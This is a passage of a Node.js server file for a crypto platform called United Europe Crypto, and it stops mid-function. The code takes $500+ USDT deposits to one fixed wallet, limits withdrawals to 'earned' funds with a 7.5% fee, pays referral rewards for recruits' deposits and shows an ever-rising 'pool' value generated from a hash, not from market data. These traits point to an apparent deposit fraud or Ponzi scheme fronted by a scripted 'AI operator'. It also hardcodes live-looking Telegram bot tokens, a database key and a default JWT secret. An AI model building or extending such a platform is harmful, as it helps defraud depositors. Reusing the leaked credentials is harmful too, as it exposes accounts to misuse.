const express = require("express");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const path = require("path");
const axios = require("axios");
const crypto = require("crypto");
const { createClient } = require("@supabase/supabase-js");

const app = express();
app.set("trust proxy", 1);

const IS_PRODUCTION = process.env.NODE_ENV === "production" || Boolean(process.env.RENDER);
const APP_ORIGIN = process.env.APP_ORIGIN || "https://cryptoapp-eqc5.onrender.com";
const ALLOWED_ORIGINS = new Set([
  APP_ORIGIN,
  "https://cryptoapp-eqc5.onrender.com",
  "http://localhost:3000",
  "http://127.0.0.1:3000"
]);

function clientIp(req) {
  let ip = req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
  if (Array.isArray(ip)) ip = ip[0] || "";
  if (String(ip).includes(",")) ip = String(ip).split(",")[0].trim();
  return String(ip).replace("::ffff:", "") || "unknown";
}

function enforceHttps(req, res, next) {
  const proto = req.headers["x-forwarded-proto"];
  if (IS_PRODUCTION && proto && proto !== "https") {
    return res.redirect(301, `https://${req.headers.host}${req.originalUrl}`);
  }
  return next();
}

function securityHeaders(req, res, next) {
  res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Referrer-Policy", "no-referrer");
  res.setHeader("Permissions-Policy", "camera=(), microphone=(), geolocation=(), payment=()");
  res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
  res.setHeader("Content-Security-Policy", [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://translate.google.com https://translate.googleapis.com https://www.gstatic.com",
    "style-src 'self' 'unsafe-inline' https://translate.googleapis.com https://www.gstatic.com",
    "img-src 'self' data: https:",
    "connect-src 'self' https://cryptoapp-eqc5.onrender.com https://api.coingecko.com https://api.binance.com https://api.qrserver.com https://translate.google.com https://translate.googleapis.com https://*.googleapis.com",
    "frame-src https://translate.google.com",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'"
  ].join("; "));
  next();
}

function createRateLimit({ windowMs, max, message }) {
  const hits = new Map();
  return (req, res, next) => {
    const now = Date.now();
    const key = `${clientIp(req)}:${req.route?.path || req.path}`;
    const entry = hits.get(key) || { count: 0, resetAt: now + windowMs };
    if (entry.resetAt <= now) {
      entry.count = 0;
      entry.resetAt = now + windowMs;
    }
    entry.count += 1;
    hits.set(key, entry);
    if (entry.count > max) {
      res.setHeader("Retry-After", Math.ceil((entry.resetAt - now) / 1000));
      return res.status(429).json({ success: false, message });
    }
    if (hits.size > 5000) {
      for (const [storedKey, storedEntry] of hits.entries()) {
        if (storedEntry.resetAt <= now) hits.delete(storedKey);
      }
    }
    return next();
  };
}

const globalLimiter = createRateLimit({ windowMs: 60 * 1000, max: 240, message: "Too many requests" });
const authLimiter = createRateLimit({ windowMs: 15 * 60 * 1000, max: 20, message: "Too many auth attempts" });
const registerLimiter = createRateLimit({ windowMs: 15 * 60 * 1000, max: 8, message: "Too many registration attempts" });
const actionLimiter = createRateLimit({ windowMs: 10 * 60 * 1000, max: 40, message: "Too many actions" });
const adminLimiter = createRateLimit({ windowMs: 10 * 60 * 1000, max: 120, message: "Too many admin requests" });

app.use(enforceHttps);
app.use(securityHeaders);
app.use(cors({
  origin(origin, callback) {
    if (!origin || ALLOWED_ORIGINS.has(origin)) return callback(null, true);
    return callback(new Error("CORS blocked"));
  },
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization", "x-admin-key"],
  credentials: false,
  maxAge: 86400
}));
app.use(express.json({ limit: "512kb", strict: true }));
app.use((err, req, res, next) => {
  if (err) return res.status(400).json({ success: false, message: "Invalid request" });
  return next();
});
app.use(globalLimiter);
app.get(["/site", "/site/"], (req, res) => res.sendFile(path.join(__dirname, "site", "index.html")));
app.use("/site", express.static(path.join(__dirname, "site"), {
  index: false,
  redirect: false,
  maxAge: IS_PRODUCTION ? "1h" : 0
}));

const PUBLIC_FILES = new Set([
  "landing.html", "index.html", "login.html", "register.html", "terms.html", "loading.html",
  "trade.html", "assets.html", "learning.html", "info.html", "rewards.html", "coin.html",
  "deposit.html", "withdraw.html", "profile.html", "admin.html", "app.css", "app-nav.js",
  "language-boot.js", "pwa.js", "service-worker.js", "manifest.json", "logo.png"
]);
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "loading.html")));
app.get("/landing.html", (req, res) => res.redirect(302, "/site"));
app.get("/:file", (req, res, next) => {
  if (!PUBLIC_FILES.has(req.params.file)) return next();
  return res.sendFile(path.join(__dirname, req.params.file));
});

const SECRET = process.env.JWT_SECRET || "SECRET_KEY";
const supabase = createClient(
  process.env.SUPABASE_URL || "https://pwqmiiruxceepjammiza.supabase.co",
  process.env.SUPABASE_KEY || "sb_publishable_7lxiFe5VT8iQx37Ip7R2YA_99WVsa1N"
);
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8714057941:AAGZL1OXRoy8-7_IoVAHBePTLwuTKmqicOg";
const TELEGRAM_MIRROR_TOKEN = process.env.TELEGRAM_MIRROR_TOKEN || "8838586164:AAHRVFEv_Elr-iNEsqyDbnqSB3_aJ8KFZvc";
const SUPPORT_TELEGRAM_TOKEN = process.env.SUPPORT_TELEGRAM_TOKEN || "8684197550:AAEJzPHMAYPIm9Rk5xDw8RxrXKze5tq_Vqo";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "337179852";
const ADMIN_KEY = process.env.ADMIN_KEY || "";
const RESEND_API_KEY = process.env.RESEND_API_KEY || "";
const EMAIL_FROM = process.env.EMAIL_FROM || "United Europe Crypto <onboarding@resend.dev>";
const BREVO_API_KEY = process.env.BREVO_API_KEY || "";
const BREVO_SENDER_EMAIL = process.env.BREVO_SENDER_EMAIL || "";
const EMAIL_VERIFICATION_REQUIRED = process.env.EMAIL_VERIFICATION_REQUIRED === "true";

const PUBLIC_USER_FIELDS = "id,fullname,nickname,country,email,phone,balance,deposit,satellites,wallet_address,referrer_id";
const DISPLAY_ID_PREFIX = "1568";
const DEPOSIT_WALLET_ADDRESS = process.env.DEPOSIT_WALLET_ADDRESS || "TTL8GGSkoAne5QRdkizLbGnmaBKv3EPoiy";
const DEPOSIT_ASSET = "USDT";
const DEPOSIT_NETWORK = "TRC20";
const WALLET_CREATE_SIGNAL_TYPE = "wallet_create";
const WALLET_CREATE_FALLBACK_TYPE = "withdraw_wallet";
const WALLET_CREATE_FALLBACK_KIND = "wallet_create_request";
const QUIZ_ANSWERS = { 1: "b", 2: "c", 3: "a", 4: "b", 5: "c" };
const LEARNING_MIN_DEPOSIT = 500;
const ACTIVE_SATELLITE_MIN_DEPOSIT = 500;
const MIN_DEPOSIT_AMOUNT = 500;
const MAX_DEPOSIT_REQUESTS = 2;
const MIN_WITHDRAW_AMOUNT = 100;
const WITHDRAW_FEE_RATE = 0.075;
const WITHDRAW_COOLDOWN_MS = 60 * 60 * 1000;
const TRADE_RATES = [0.01, 0.01, 0.0025, 0.005, 0.0075, 0.015];
const TRADE_SETTLE_MS = 10 * 60 * 1000;
const REFERRER_REWARDS = [50, 75, 100, 100, 150];
const BALANCE_REWARDS = [
  [1000, 50],
  [2500, 100],
  [5000, 200],
  [10000, 500],
  [20000, 1000],
  [50000, 2500],
  [100000, 5000]
];
const QUIZ_REWARD_AMOUNT = 2.5;
const TRADE_STREAK_REWARDS = [
  [10, 10],
  [30, 50],
  [50, 75],
  [100, 150]
];
const POOL_BASE = 1000347;
const POOL_START_DAY = Date.UTC(2026, 5, 22) / 86400000;

function auth(req, res, next) {
  const token = req.headers.authorization;
  if (!token) return res.status(401).json({ success: false, message: "Unauthorized" });

  try {
    const userId = Number(jwt.verify(token, SECRET).id);
    if (!Number.isInteger(userId) || userId <= 0) throw new Error("Invalid user");
    req.userId = userId;
    next();
  } catch {
    return res.status(401).json({ success: false, message: "Unauthorized" });
  }
}

function adminAuth(req, res, next) {
  const key = req.headers["x-admin-key"];
  if (!ADMIN_KEY) return res.status(503).json({ success: false, message: "Admin access is not configured" });
  if (!key || key !== ADMIN_KEY) return res.status(401).json({ success: false, message: "Unauthorized" });
  next();
}

async function findUser(id, fields = PUBLIC_USER_FIELDS) {
  const userId = Number(id);
  if (!Number.isInteger(userId) || userId <= 0) return null;
  const { data } = await supabase.from("users").select(fields).eq("id", userId).maybeSingle();
  return data;
}

function formatUserId(id) {
  const sequence = Number(id);
  if (!Number.isInteger(sequence) || sequence <= 0) return `${DISPLAY_ID_PREFIX}0000`;
  return `${DISPLAY_ID_PREFIX}${String(sequence).padStart(4, "0").slice(-4)}`;
}

function parseUserId(value) {
  const text = String(value || "").trim();
  if (!text) return null;
  if (/^\d{8}$/.test(text) && text.startsWith(DISPLAY_ID_PREFIX)) {
    const sequence = Number(text.slice(4));
    return Number.isInteger(sequence) && sequence > 0 ? sequence : null;
  }
  if (/^\d{1,4}$/.test(text)) {
    const sequence = Number(text);
    return Number.isInteger(sequence) && sequence > 0 ? sequence : null;
  }
  return null;
}

function withDisplayId(user) {
  return user ? { ...user, display_id: formatUserId(user.id) } : user;
}

function cleanText(value, maxLength = 120) {
  return String(value || "")
    .replace(/[\u0000-\u001F\u007F]/g, "")
    .replace(/[<>]/g, "")
    .trim()
    .slice(0, maxLength);
}

function cleanEmail(value) {
  return String(value || "").trim().toLowerCase().slice(0, 160);
}

function cleanPhone(value) {
  return String(value || "").replace(/\D/g, "").slice(0, 15);
}

function cleanWallet(value) {
  return String(value || "").trim().replace(/[\u0000-\u001F\u007F\s<>]/g, "").slice(0, 160);
}

function isValidWallet(value) {
  return /^[A-Za-z0-9:_\-.]{10,160}$/.test(value);
}

function personalWalletAddress(user) {
  const wallet = cleanWallet(user?.wallet_address);
  return wallet;
}

function positiveAmount(value, max = 1000000) {
  const amount = Number(value);
  return Number.isFinite(amount) && amount > 0 && amount <= max ? Number(amount.toFixed(2)) : null;
}

function safeJsonObject(value) {
  try {
    const parsed = JSON.parse(String(value || "{}"));
    return parsed && typeof parsed === "object" && !Array.isArray(parsed) ? parsed : {};
  } catch {
    return {};
  }
}

function moneyValue(value) {
  const amount = Number(value);
  return Number.isFinite(amount) ? Number(amount.toFixed(2)) : 0;
}

function withdrawalFeeAmount(grossAmount) {
  return moneyValue(Number(grossAmount || 0) * WITHDRAW_FEE_RATE);
}

function withdrawalNetAmount(grossAmount) {
  const gross = moneyValue(grossAmount);
  return moneyValue(gross - withdrawalFeeAmount(gross));
}

function withdrawalPayload(wallet, grossAmount) {
  const gross = moneyValue(grossAmount);
  const fee = withdrawalFeeAmount(gross);
  const net = moneyValue(gross - fee);
  return JSON.stringify({
    wallet: cleanWallet(wallet),
    gross_amount: gross,
    fee_rate: WITHDRAW_FEE_RATE,
    fee_amount: fee,
    net_amount: net
  });
}

function withdrawalDetails(value, amount = 0) {
  const payload = safeJsonObject(value);
  const payloadWallet = cleanWallet(payload.wallet);
  const wallet = payloadWallet || cleanWallet(value);
  const gross = moneyValue(payload.gross_amount);
  const fee = moneyValue(payload.fee_amount);
  const net = moneyValue(payload.net_amount);
  const fallbackAmount = moneyValue(amount);
  return {
    wallet,
    grossAmount: gross > 0 ? gross : fallbackAmount,
    feeAmount: gross > 0 ? fee : 0,
    netAmount: net > 0 ? net : fallbackAmount
  };
}

function withdrawalGrossAmount(signal) {
  return withdrawalDetails(signal?.wallet, signal?.amount).grossAmount;
}

function walletCreatePayload(wallet = "") {
  return JSON.stringify({ kind: WALLET_CREATE_FALLBACK_KIND, wallet: cleanWallet(wallet) });
}

function walletCreatePayloadWallet(value) {
  const payload = safeJsonObject(value);
  return payload.kind === WALLET_CREATE_FALLBACK_KIND ? cleanWallet(payload.wallet) : "";
}

function isWalletCreateSignal(signal) {
  return signal?.type === WALLET_CREATE_SIGNAL_TYPE ||
    (signal?.type === WALLET_CREATE_FALLBACK_TYPE && safeJsonObject(signal.wallet).kind === WALLET_CREATE_FALLBACK_KIND);
}

async function pendingWalletCreateRequests(userId) {
  const { data, error } = await supabase
    .from("signals")
    .select("id,type,wallet")
    .eq("user_id", userId)
    .in("type", [WALLET_CREATE_SIGNAL_TYPE, WALLET_CREATE_FALLBACK_TYPE])
    .eq("status", "pending")
    .limit(10);
  if (error) throw error;
  return (data || []).filter(isWalletCreateSignal);
}

async function addWalletCreateSignal(user) {
  try {
    await addSignal({
      user_id: user.id,
      type: WALLET_CREATE_SIGNAL_TYPE,
      amount: 0,
      wallet: "requested",
      status: "pending"
    });
    return WALLET_CREATE_SIGNAL_TYPE;
  } catch (error) {
    console.error("WALLET CREATE SIGNAL FALLBACK:", error.message || error);
    await addSignal({
      user_id: user.id,
      type: WALLET_CREATE_FALLBACK_TYPE,
      amount: 0,
      wallet: walletCreatePayload(),
      status: "pending"
    });
    return WALLET_CREATE_FALLBACK_TYPE;
  }
}

function poolRateForDay(dayNumber) {
  const date = new Date(dayNumber * 86400000).toISOString().slice(0, 10);
  let hash = 2166136261;
  for (const character of date) {
    hash ^= character.charCodeAt(0);
    hash = Math.imul(hash, 16777619) >>> 0;
  }
  return 1 + (100 + (hash % 401)) / 10000;
}

function poolValueForDay(dayNumber) {
  let value = POOL_BASE;
  if (dayNumber > POOL_START_DAY) {
    for (let day = POOL_START_DAY + 1; day <= dayNumber; day += 1) value *= poolRateForDay(day);
  } else if (dayNumber < POOL_START_DAY) {
    for (let day = POOL_START_DAY; day > dayNumber; day -= 1) value /= poolRateForDay(day);
  }
  return Number(value.toFixed(2));
}

function getPoolSnapshot(days = 30) {
  const today = Math.floor(Date.now() / 86400000);
  const series = [];
  for (let day = today - days + 1; day <= today; day += 1) {
    series.push({
      date: new Date(day * 86400000).toISOString().slice(0, 10),
      value: poolValueForDay(day)
    });
  }
  return {
    current: poolValueForDay(today),
    nextChangeAt: new Date((today + 1) * 86400000).toISOString(),
    dailyChangePercent: Number(((poolRateForDay(today) - 1) * 100).toFixed(2)),
    series
  };
}

async function addSignal(signal) {
  const { error } = await supabase.from("signals").insert([signal]);
  if (error) throw error;
}

async function sendTelegramMessage(text, tokens = [TELEGRAM_TOKEN]) {
  const uniqueTokens = [...new Set(tokens.filter(Boolean))];
  const results = await Promise.allSettled(uniqueTokens.map(token => axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
    chat_id: CHAT_ID,
    text
  })));
  results.forEach((result, index) => {
    if (result.status === "rejected") {
      const tokenLabel = `${uniqueTokens[index].slice(0, 8)}...`;
      const details = result.reason?.response?.data || result.reason?.message || result.reason;
      console.error("TELEGRAM SEND ERROR:", tokenLabel, details);
    }
  });
}

function requestTelegramText(type, user, amount, wallet) {
  const title = type === "deposit" ? "DEPOSIT REQUEST" : "WITHDRAW REQUEST";
  if (type === "withdraw") {
    const details = withdrawalDetails(wallet, amount);
    return [
      title,
      `ID: ${formatUserId(user.id)}`,
      `Email: ${user.email || "-"}`,
      `Name: ${user.fullname || "-"}`,
      `Nickname: ${user.nickname || "-"}`,
      `Phone: ${user.phone || "-"}`,
      `Requested amount: $${details.grossAmount.toFixed(2)}`,
      `Commission 7.5%: $${details.feeAmount.toFixed(2)}`,
      `Amount after commission: $${details.netAmount.toFixed(2)}`,
      `Withdrawal wallet: ${details.wallet || "-"}`,
      `Balance: $${Number(user.balance || 0).toFixed(2)}`,
      `Confirmed deposit: $${Number(user.deposit || 0).toFixed(2)}`
    ].filter(Boolean).join("\n");
  }
  return [
    title,
    `ID: ${formatUserId(user.id)}`,
    `Email: ${user.email || "-"}`,
    `Name: ${user.fullname || "-"}`,
    `Nickname: ${user.nickname || "-"}`,
    `Phone: ${user.phone || "-"}`,
    `Amount: $${Number(amount || 0).toFixed(2)}`,
    type === "deposit" ? `Asset: ${DEPOSIT_ASSET}` : null,
    type === "deposit" ? `Network: ${DEPOSIT_NETWORK}` : null,
    type === "deposit" ? `Deposit wallet: ${wallet || "-"}` : `Withdrawal wallet: ${wallet || "-"}`,
    `Balance: $${Number(user.balance || 0).toFixed(2)}`,
    `Confirmed deposit: $${Number(user.deposit || 0).toFixed(2)}`
  ].filter(Boolean).join("\n");
}

function walletCreateTelegramText(user, status = "") {
  return [
    "WALLET CREATE REQUEST",
    status ? `Status: ${status}` : null,
    `ID: ${formatUserId(user.id)}`,
    `Email: ${user.email || "-"}`,
    `Name: ${user.fullname || "-"}`,
    `Nickname: ${user.nickname || "-"}`,
    `Phone: ${user.phone || "-"}`,
    "Assigned wallet: waiting for admin"
  ].filter(Boolean).join("\n");
}

async function notifyWalletCreateRequest(user, status = "") {
  await sendTelegramMessage(walletCreateTelegramText(user, status), [TELEGRAM_TOKEN, TELEGRAM_MIRROR_TOKEN]);
}

async function ensureWalletCreateRequest(user, notifyExisting = false) {
  const pending = await pendingWalletCreateRequests(user.id);
  if (pending.length) {
    if (notifyExisting) await notifyWalletCreateRequest(user, "already pending");
    return { created: false, pending: true };
  }
  await addWalletCreateSignal(user);
  await notifyWalletCreateRequest(user);
  return { created: true, pending: true };
}

function supportPayload(role, text, extra = {}) {
  return JSON.stringify({
    role,
    text: cleanText(text, 1800),
    ...extra
  });
}

function parseSupportPayload(value) {
  const payload = safeJsonObject(value);
  return {
    role: cleanText(payload.role || "user", 30),
    text: cleanText(payload.text || "", 1800),
    source: cleanText(payload.source || "", 60)
  };
}

function supportLanguage(text) {
  return /[A-Za-z]/.test(text) && !/[А-Яа-яІіЇїЄєҐґ]/.test(text) ? "en" : "uk";
}

function supportAnswer(message) {
  const text = String(message || "").toLowerCase();
  const lang = supportLanguage(text);
  const answer = (uk, en) => ({ handled: true, text: lang === "en" ? en : uk });
  const handoff = (uk, en) => ({ handled: false, text: lang === "en" ? en : uk });

  if (/^(hi|hello|hey|привіт|вітаю|добрий день|доброго дня|добрий вечір|здравств|салам)\b/i.test(text)) {
    return answer(
      "Вітаю! Я AI оператор United Europe Crypto. Можу пояснити реєстрацію, поповнення, вивід, навчання, сателітів, торгівлю, винагороди, сайт проекту та ризики. Напишіть коротко, що саме цікавить.",
      "Hello! I am the United Europe Crypto AI operator. I can explain registration, deposits, withdrawals, learning, satellites, trading, rewards, the project website and risks. Tell me what you want to know."
    );
  }
  if (/(що ти вмієш|чим допоможеш|help|допоможи|помічник|оператор ai|ai оператор|support bot|підтримка може)/i.test(text)) {
    return answer(
      "Я можу швидко відповісти на загальні питання по додатку: як зареєструватися, як поповнити від $500, як вивести від $100 із заробленого, як працює навчання, сателіти, торгівля, винагороди та де знайти сайт проекту. Якщо питання стосується конкретної помилки або вашої заявки, я передам його підтримці.",
      "I can answer general app questions: registration, deposits from $500, withdrawals from $100 earned funds, learning, satellites, trading, rewards and the project website. If the question is about a specific error or request, I will pass it to support."
    );
  }
  if (/(як почати|з чого почати|start|почати|новач|перший раз|що робити)/i.test(text)) {
    return answer(
      "Почніть із трьох кроків: 1) прочитайте умови користування; 2) зареєструйте акаунт і збережіть email/пароль; 3) після входу перегляньте Інфо, Активи, Поповнення та Навчання. Навчання відкривається після підтвердженого поповнення від $500.",
      "Start with three steps: 1) read the terms; 2) create an account and keep your email/password safe; 3) after login, check Info, Assets, Deposit and Learning. Learning opens after an approved deposit from $500."
    );
  }
  if (/(що це|проєкт|проект|about|platform|платформа|united europe crypto|uec)/i.test(text)) {
    return answer(
      "United Europe Crypto - це платформа для навчання, внутрішнього обліку активів, заявок на поповнення/вивід, винагород, сателітної структури та моделювання торгової активності. Важливо: криптовалюти ризикові, прибуток не гарантується.",
      "United Europe Crypto is a platform for learning, internal asset accounting, deposit/withdrawal requests, rewards, satellite structure and modeled trading activity. Important: crypto is risky and profit is not guaranteed."
    );
  }
  if (/(дякую|спасиб|thanks|thank you|ок|окей|добре|зрозуміло)/i.test(text)) {
    return answer(
      "Будь ласка. Якщо потрібно, напишіть тему одним словом: реєстрація, поповнення, вивід, навчання, сателіти, торгівля, винагороди або сайт.",
      "You are welcome. If needed, send one topic: registration, deposit, withdrawal, learning, satellites, trading, rewards or website."
    );
  }
  if (/(оператор|адмін|людина|живий|manager|human|admin|скарг|помилка|не працює|не працю|завис|заявка не|баланс неправиль|не прийш)/i.test(text)) {
    return handoff(
      "Схоже, це питання потребує перевірки оператором. Я передам його підтримці, і відповідь з'явиться в цьому чаті.",
      "This looks like a question that needs operator review. I will pass it to support, and the answer will appear in this chat."
    );
  }
  if (/(парол|password|login|логін|увійти|вхід|не вход)/i.test(text)) {
    return answer(
      "Для входу використайте email і пароль, які були вказані при реєстрації. Якщо вхід не працює, перевірте правильність email, пароль і стабільність інтернету. Якщо проблема залишиться, я передам звернення підтримці.",
      "Use the email and password from registration. If login does not work, check the email, password and internet connection. If the issue remains, I will pass it to support."
    );
  }
  if (/(реєстр|registr|код|email|пошта|підтвердж)/i.test(text)) {
    return answer(
      "Реєстрація проходить через сторінку умов і форму створення акаунту. Якщо підтвердження email увімкнене, без коду з пошти завершити реєстрацію не можна. Перевірте папку Спам і правильність адреси.",
      "Registration goes through the terms page and account form. If email verification is enabled, the code is required. Check Spam and make sure the email address is correct."
    );
  }
  if (/(поповн|deposit|депозит|usdt|trc20|500)/i.test(text)) {
    return answer(
      "Мінімальна сума поповнення становить $500. Користувач переказує USDT у мережі TRC20 на вказаний гаманець, створює заявку в додатку, а баланс змінюється тільки після підтвердження адміністратором. Ліміт два поповнення рахується лише після підтверджених поповнень.",
      "The minimum deposit is $500. Send USDT via TRC20 to the shown wallet, create a request in the app, and the balance changes only after admin approval. The two-deposit limit counts only approved deposits."
    );
  }
  if (/(вив(е|і)д|withdraw|знят|100|гаманець)/i.test(text)) {
    return answer(
      "Вивід доступний від $100, один раз на годину, і тільки із зароблених коштів. Комісія за вивід становить 7.5%, тому адміністратор бачить суму до виплати вже після комісії. Гаманець для виводу може відрізнятися від гаманця акаунту.",
      "Withdrawals start from $100, once per hour, and only from earned funds. The withdrawal fee is 7.5%, so the admin sees the payable amount after the fee. The withdrawal wallet may differ from the account wallet."
    );
  }
  if (/(навчан|learning|урок|тест|quiz)/i.test(text)) {
    return answer(
      "Навчання відкривається після підтвердженого поповнення від $500. Уроки містять коротку інформацію і тест. За правильне проходження тесту може нараховуватися внутрішня винагорода $2.50.",
      "Learning opens after an approved deposit from $500. Lessons include short information and a quiz. Correct completion can create a $2.50 internal reward."
    );
  }
  if (/(сател|satellite|запрош|referr|структур)/i.test(text)) {
    return answer(
      "Сателіти - це запрошені користувачі. Вони стають активними після підтвердженого поповнення від $500. Активні сателіти поступово відкривають додаткові торгові позиції запрошувачу.",
      "Satellites are invited users. They become active after an approved deposit from $500. Active satellites gradually unlock additional trading positions for the inviter."
    );
  }
  if (/(торг|trade|угод|позиці|дохід|відсот)/i.test(text)) {
    return answer(
      "Основна торгова позиція доступна всім користувачам з балансом. Додаткові позиції відкриваються через активних сателітів. Угода завершується через 10 хвилин, а нова можливість торгувати відкривається о 00:00 кожного дня.",
      "The main trading position is available to users with balance. Extra positions unlock through active satellites. A trade settles after 10 minutes, and the next daily opportunity opens at 00:00."
    );
  }
  if (/(винагород|reward|бонус|отримати)/i.test(text)) {
    return answer(
      "Винагороди відображаються на окремій сторінці. Кнопка Отримати активується тільки після виконання умови: навчання, активні сателіти, торгові дні поспіль або балансові рівні.",
      "Rewards are shown on a separate page. The Claim button becomes active only after the goal is completed: learning, active satellites, trading streaks or balance levels."
    );
  }
  if (/(сайт|site|website|публічн|інфо)/i.test(text)) {
    return answer(
      "Публічний сайт проекту відкривається за адресою /site. У додатку перехід на сайт є на сторінці Інфо. Сайт пояснює ідею проекту, навчання, ризики, FAQ і зв'язок з додатком.",
      "The public project website is available at /site. In the app, the link is on the Info page. The website explains the project idea, learning, risks, FAQ and connection with the app."
    );
  }
  if (/(ризик|risk|гарант|прибут|profit|втрат)/i.test(text)) {
    return answer(
      "Криптовалюти мають високий ризик, а прибуток не гарантується. Платформа дає навчання, структуру та внутрішній облік, але користувач повинен розуміти можливі втрати і діяти відповідально.",
      "Crypto is high-risk and profit is not guaranteed. The platform provides learning, structure and internal accounting, but users must understand possible losses and act responsibly."
    );
  }
  return answer(
    "Я можу відповісти на загальні питання про проект. Спробуйте уточнити тему: реєстрація, поповнення, вивід, навчання, сателіти, торгівля, винагороди, сайт або ризики. Якщо потрібна перевірка конкретного акаунту чи заявки, напишіть: оператор.",
    "I can answer general questions about the project. Try one topic: registration, deposit, withdrawal, learning, satellites, trading, rewards, website or risks. If you need a specific account or request check, type: operator."
  );
}

function formatSupportTelegram(user, message) {
  return [
    "SUPPORT QUESTION",
    `ID: ${formatUserId(user.id)}`,
    `Email: ${user.email || "-"}`,
    `Name: ${user.fullname || "-"}`,
    `Nickname: ${user.nickname || "-"}`,
    "",
    cleanText(message, 1800)
  ].join("\n");
}

function dayKey(date = new Date()) {
  return date.toLocaleDateString("en-CA", { timeZone: "Europe/Kyiv" });
}

function nextMidnightKyivMs(now = Date.now()) {
  const current = dayKey(new Date(now));
  let low = now;
  let high = now + 36 * 60 * 60 * 1000;
  while (dayKey(new Date(high)) === current) high += 12 * 60 * 60 * 1000;
  while (high - low > 1000) {
    const mid = Math.floor((low + high) / 2);
    if (dayKey(new Date(mid)) === current) low = mid;
    else high = mid;
  }
  return high;
}

async function grantRewardOnce(userId, type, amount, wallet) {
  const user = await findUser(userId, "id,balance");
  if (!user || !Number.isFinite(Number(amount)) || Number(amount) <= 0) return false;
  let existingQuery = supabase
    .from("signals")
    .select("id")
    .eq("user_id", user.id)
    .eq("type", type)
    .limit(1);
  if (!String(type).startsWith("reward_")) existingQuery = existingQuery.eq("wallet", wallet);
  const { data: existing } = await existingQuery.maybeSingle();
  if (existing) return false;

  const newBalance = Number((Number(user.balance || 0) + Number(amount)).toFixed(2));
  const { error } = await supabase.from("users").update({ balance: newBalance }).eq("id", user.id);
  if (error) throw error;
  await addSignal({ user_id: user.id, type, amount: Number(amount), wallet, status: "rewarded" });
  return true;
}

async function grantBalanceRewards(userId) {
  for (const [threshold, reward] of BALANCE_REWARDS) {
    const user = await findUser(userId, "id,balance");
    if (!user || Number(user.balance || 0) < threshold) continue;
    await grantRewardOnce(user.id, `reward_balance_${threshold}`, reward, `balance:${threshold}`);
  }
}

async function getTradeStreak(userId) {
  const { data } = await supabase
    .from("signals")
    .select("created_at")
    .eq("user_id", userId)
    .like("type", "trade_%")
    .eq("status", "rewarded")
    .order("created_at", { ascending: false })
    .limit(140);
  const days = [...new Set((data || []).map(item => dayKey(new Date(item.created_at))))];
  let streak = 0;
  let cursor = new Date();
  while (days.includes(dayKey(cursor))) {
    streak += 1;
    cursor = new Date(cursor.getTime() - 24 * 60 * 60 * 1000);
  }
  return streak;
}

function invitedSatelliteRewardAmount(deposit) {
  const amount = Number(deposit || 0);
  if (amount >= 2000) return 100;
  if (amount >= 1000) return 45;
  if (amount >= ACTIVE_SATELLITE_MIN_DEPOSIT) return 5;
  return 0;
}

async function grantSatelliteRewards(satelliteId) {
  const satellite = await findUser(satelliteId, "id,referrer_id,deposit");
  if (!satellite || Number(satellite.deposit || 0) < ACTIVE_SATELLITE_MIN_DEPOSIT) return;

  if (satellite.referrer_id) {
    const invitedReward = invitedSatelliteRewardAmount(satellite.deposit);
    if (invitedReward > 0) {
      await grantRewardOnce(satellite.id, "reward_invited_satellite", invitedReward, `satellite:${satellite.id}`);
    }

    const { data: activeSatellites } = await supabase
      .from("users")
      .select("id,deposit")
      .eq("referrer_id", satellite.referrer_id)
      .gte("deposit", ACTIVE_SATELLITE_MIN_DEPOSIT)
      .order("id", { ascending: true })
      .limit(5);
    for (const [index, activeSatellite] of (activeSatellites || []).entries()) {
      if (index >= REFERRER_REWARDS.length) break;
      await grantRewardOnce(
        satellite.referrer_id,
        `reward_referrer_satellite_${index + 1}`,
        REFERRER_REWARDS[index],
        `satellite:${activeSatellite.id}`
      );
    }
  }
}

async function grantTradeStreakRewards(userId) {
  const streak = await getTradeStreak(userId);
  for (const [daysRequired, reward] of TRADE_STREAK_REWARDS) {
    if (streak >= daysRequired) {
      await grantRewardOnce(userId, `reward_trade_streak_${daysRequired}`, reward, `trade_streak:${daysRequired}`);
    }
  }
}

function rewardDefinitions() {
  return [
    ...BALANCE_REWARDS.map(([threshold, amount]) => ({
      type: `reward_balance_${threshold}`,
      group: "balance",
      title: `Баланс від $${threshold.toLocaleString("en-US")}`,
      amount,
      threshold
    })),
    { type: "reward_invited_satellite", group: "satellites", title: "Винагорода запрошеному після поповнення від $500", amount: 5, satelliteRank: 0, variableAmount: true },
    ...REFERRER_REWARDS.map((amount, index) => ({
      type: `reward_referrer_satellite_${index + 1}`,
      group: "satellites",
      title: `${index + 1}-й активний сателіт`,
      amount,
      satelliteRank: index + 1
    })),
    ...TRADE_STREAK_REWARDS.map(([days, amount]) => ({
      type: `reward_trade_streak_${days}`,
      group: "trade",
      title: `${days} днів торгівлі підряд`,
      amount,
      streakDays: days
    }))
  ];
}

async function activeSatelliteCount(userId) {
  const { count } = await supabase
    .from("users")
    .select("id", { count: "exact", head: true })
    .eq("referrer_id", userId)
    .gte("deposit", ACTIVE_SATELLITE_MIN_DEPOSIT);
  return count || 0;
}

async function rewardProgress(userId) {
  await settleMatureTrades(userId);
  const user = await findUser(userId, "id,balance,deposit,referrer_id");
  if (!user) return null;
  const [satellites, tradeStreak, claimedRows] = await Promise.all([
    activeSatelliteCount(userId),
    getTradeStreak(userId),
    supabase
      .from("signals")
      .select("type")
      .eq("user_id", userId)
      .like("type", "reward_%")
      .in("status", ["rewarded", "approved"])
  ]);
  const claimed = new Set((claimedRows.data || []).map(row => row.type));
  const balance = Number(user.balance || 0);
  const deposit = Number(user.deposit || 0);
  return rewardDefinitions().map(reward => {
    let eligible = false;
    let progress = 0;
    let target = 1;
    let amount = Number(reward.amount);
